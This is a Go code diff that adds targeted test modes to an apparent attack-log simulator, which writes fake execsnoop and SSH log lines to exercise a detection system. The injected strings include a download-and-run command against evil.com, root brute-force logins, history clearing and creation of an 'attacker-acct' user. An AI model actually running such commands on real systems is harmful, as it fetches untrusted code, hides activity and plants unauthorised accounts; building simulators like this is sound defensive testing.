@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"log"
 	"math/rand"
@@ -45,6 +46,114 @@ var suspiciousScenarios = []Scenario{
 
 func main() {
 	log.Println("Starting log simulator....")
+
+	testcase := flag.String("testcase", "", "Run a specific, targeted test case: 'download', 'bruteforce', 'newuser'")
+
+	flag.Parse()
+
+	if *testcase != "" {
+		runTargetedTest(*testcase)
+	} else {
+		runChaosSimulation()
+	}
+}
+
+func appendAndPrint(message, logLine string) {
+	fmt.Print(message)
+	appendLog(logLine)
+	fmt.Println(" -> Done")
+}
+
+func runTargetedTest(name string) {
+	log.Printf("Starting targeted log simulation for '%s'...", name)
+	switch name {
+	case "download":
+		log.Println("Starting targeted log simulation for 'Download & Execute'...")
+
+		// --- The Attack Chain ---
+
+		// 1. Attacker downloads a payload to /tmp
+		log.Println("Injecting: File Download (wget)")
+		timestamp1 := time.Now().Format("15:04:05")
+		pid1, ppid1 := rand.Intn(90000)+1000, rand.Intn(90000)+1000
+		downloadLog := fmt.Sprintf(execsnoopTemplate, timestamp1, 1000, "wget", pid1, ppid1, 0, "wget -O /tmp/payload.sh http://evil.com/payload.sh")
+		appendLog(downloadLog)
+
+		// 2. Wait for 5 seconds
+		time.Sleep(5 * time.Second)
+
+		// 3. Attacker executes the payload
+		log.Println("Injecting: Payload Execution (bash)")
+		timestamp2 := time.Now().Format("15:04:05")
+		pid2, ppid2 := rand.Intn(90000)+1000, rand.Intn(90000)+1000
+		executeLog := fmt.Sprintf(execsnoopTemplate, timestamp2, 1000, "bash", pid2, ppid2, 0, "bash /tmp/payload.sh")
+		appendLog(executeLog)
+
+		log.Println("Simulation finished.")
+	case "bruteforce":
+		log.Println("Starting targeted log simulation for 'Brute-Force & Evasion'...")
+		attackIP := "198.51.100.99"
+
+		log.Println("Injecting: SSH Brute-Force")
+		for i := 0; i < 6; i++ {
+			timestamp := time.Now().Format("Jan  2 15:04:05")
+			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
+			failedLog := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "root", attackIP, port)
+			appendLog(failedLog)
+			time.Sleep(200 * time.Millisecond) // Short delay between attempts
+		}
+
+		time.Sleep(3 * time.Second)
+
+		log.Println("Injecting: Successful Login post-brute-force")
+		timestampSuccess := time.Now().Format("Jan  2 15:04:05")
+		pidSuccess, portSuccess := rand.Intn(9000)+1000, rand.Intn(60000)+1024
+		successLog := fmt.Sprintf(acceptedLoginTemplate, timestampSuccess, pidSuccess, "root", attackIP, portSuccess)
+		appendLog(successLog)
+
+		time.Sleep(5 * time.Second)
+
+		// 5. Attacker tries to cover their tracks
+		log.Println("Injecting: Defense Evasion (history clear)")
+		timestampEvasion := time.Now().Format("15:04:05")
+		pidEvasion, ppidEvasion := rand.Intn(90000)+1000, rand.Intn(90000)+1000
+		evasionLog := fmt.Sprintf(execsnoopTemplate, timestampEvasion, 0, "bash", pidEvasion, ppidEvasion, 0, "history -c")
+		appendLog(evasionLog)
+
+		log.Println("Simulation finished.")
+	case "newuser":
+		// --- Test Case for New Account & Immediate Use ---
+		log.Println("Starting targeted log simulation for 'New Account & Immediate Use'...")
+		newUser := "attacker-acct"
+		loginIP := "203.0.113.55"
+
+		// --- The Attack Chain ---
+
+		// 1. Attacker creates a new user for persistence.
+		log.Printf("Injecting: New user creation (%s)", newUser)
+		timestampCreate := time.Now().Format("15:04:05")
+		pidCreate, ppidCreate := rand.Intn(90000)+1000, rand.Intn(90000)+1000
+		createLog := fmt.Sprintf(execsnoopTemplate, timestampCreate, 0, "useradd", pidCreate, ppidCreate, 0, "useradd "+newUser)
+		appendLog(createLog)
+
+		// 2. Wait for 5 seconds
+		time.Sleep(5 * time.Second)
+
+		// 3. Attacker immediately uses the new account to log in.
+		log.Printf("Injecting: Successful login for new user %s", newUser)
+		timestampLogin := time.Now().Format("Jan  2 15:04:05")
+		pidLogin, portLogin := rand.Intn(9000)+1000, rand.Intn(60000)+1024
+		loginLog := fmt.Sprintf(acceptedLoginTemplate, timestampLogin, pidLogin, newUser, loginIP, portLogin)
+		appendLog(loginLog)
+	default:
+		log.Fatalf("Unknown test case: %s", name)
+	}
+
+	log.Println("Simulation finished.")
+}
+
+func runChaosSimulation() {
+	log.Println("Starting random 'chaos' attack log simulation...")
 
 	for {
 		sleepDuration := time.Duration(rand.Intn(4)+1) * time.Second
@@ -99,10 +208,4 @@ func main() {
 			appendAndPrint(logMessage, logLine)
 		}
 	}
-}
-
-func appendAndPrint(message, logLine string) {
-	fmt.Print(message)
-	appendLog(logLine)
-	fmt.Println(" -> Done")
 }
